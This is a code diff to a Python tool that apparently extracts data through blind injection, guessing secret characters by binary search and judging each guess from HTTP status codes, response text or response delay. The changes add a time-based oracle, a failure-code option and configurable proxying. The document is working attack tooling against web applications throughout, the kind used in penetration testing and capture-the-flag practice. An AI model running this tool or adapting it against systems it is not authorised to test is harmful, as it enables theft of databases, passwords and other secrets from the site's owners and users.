@@ -14,7 +14,11 @@ def create_argument_parser():
     parser.add_argument('-payload', required=True, help="The payload to use with fuzzing values")
     parser.add_argument('-length', required=True, type=int, help="The length of the data we're trying to dump")
     parser.add_argument('-mc', type=int, help="HTTP status code to indicate a successful request")
-    parser.add_argument('-mt', help="Text in the HTTP response to indicate a successful request")
+    parser.add_argument("-fc", type=int, help="HTTP status code to indicate a failed (incorrect guess) request")
+    parser.add_argument('-mb', help="Text in the HTTP response body to indicate a successful request")
+    parser.add_argument('-mt', type=int, help="HTTP response duration in seconds to indicate a successful request")
+    parser.add_argument("-pi", help="Proxy server ip")
+    parser.add_argument("-pp", help="Proxy server port")
 
     return parser
 
@@ -26,11 +30,15 @@ def make_request(payload:str, guess:str) -> dict:
     method, endpoint, headers = request_parser.parse_headers(header_lines, payload)
     data = ''.join(body)
     
-    # Proxy through burp to see what's going on
-    proxies = {
-        "http": "http://127.0.0.1:8080",
-        "https": "http://127.0.0.1:8080"
-    }
+    if args.pi and args.pp:
+        ip = args.pi
+        port = args.pp
+        proxies = {
+            "http": f"http://{ip}:{port}",
+            "https": f"http://{ip}:{port}"
+        }
+    else:
+        proxies = {}
     
     res = requests.request(method, args.target + endpoint, headers=headers, data=data, proxies=proxies, verify=False)
     if res.elapsed.seconds > 20:
@@ -40,7 +48,8 @@ def make_request(payload:str, guess:str) -> dict:
     return {
         "statuscode": res.status_code,
         "body": res.text,
-        "headers": res.headers
+        "headers": res.headers,
+        "time": res.elapsed.seconds
     }
 
 def binary_search(index: str, payload: str) -> str:
@@ -54,7 +63,8 @@ def binary_search(index: str, payload: str) -> str:
         mid = (low + high) // 2
         guess = possible_values[mid]
         
-        # Print status
+        
+        #Print status
         sys.stdout.write(f"\rDump: ({int(index)}/{args.length}) {dump + guess}")
         sys.stdout.flush()
 
@@ -64,22 +74,32 @@ def binary_search(index: str, payload: str) -> str:
         feedback = ""
         if args.mc:
         # Check by statuscode
-            if res["statuscode"] == 500:
+            if res["statuscode"] == args.mc:
                 feedback = "g"
-            elif res["statuscode"] == 200:
+            elif res["statuscode"] == args.fc:
                 check_res = make_request(payload.replace(">", "="), guess)
-                if check_res["statuscode"] == 500:
+                if check_res["statuscode"] == args.mc:
                     feedback = "e"
                 else : feedback = "l"
-        else:
+        elif args.mb:
         # Check by response body
-            if args.mt in str(res["body"]):
+            if args.mb in str(res["body"]):
                 feedback = "g"
             else:
                 check_res = make_request(payload.replace(">", "="), guess)
-                if args.mt in check_res["body"]:
+                if args.mb in check_res["body"]:
                     feedback = "e"
                 else : feedback = "l"
+        elif args.mt:
+            # Check by response time
+            if res["time"] >= args.mt:
+                check_res = make_request(payload.replace(">=", "="), guess)
+                if check_res["time"] >= args.mt:
+                    feedback = "e"
+                else:
+                    feedback = "g"
+            else:
+                feedback = "l"
 
         if feedback == 'e':
             return guess
@@ -92,8 +112,12 @@ if __name__ == "__main__":
     parser = create_argument_parser()
     args = parser.parse_args()
 
-    if args.mc is None and args.mt is None:
-        parser.error("Please specify -mc or -mt. For more info use -h or --help.")
+    if args.mc is None and args.mt is None and args.mb is None:
+        parser.error("Please specify -mc, -mb or -mt. For more info use -h or --help.")
+    if (args.pi and not args.pp) or (args.pp and not args.pi):
+        parser.error("Please specify -pi and -pp")
+    if (args.mc and not args.fc):
+        parser.error("Please specify -fc with -mc")
 
     global dump
     dump = ""
@@ -108,8 +132,7 @@ if __name__ == "__main__":
         i += 1 # Start from 1 rather than 0
         secret = binary_search(str(i), payload)
         if type(secret) != str:
-            print("Something went wrong with the HTTP response. Make sure you can ping the target. Exiting...")
-            print("\n")
+            print("\nSomething went wrong with the HTTP response. Make sure you can ping the target. Exiting...")
             exit(0)
         dump += secret
         if i == args.length : print("\n")
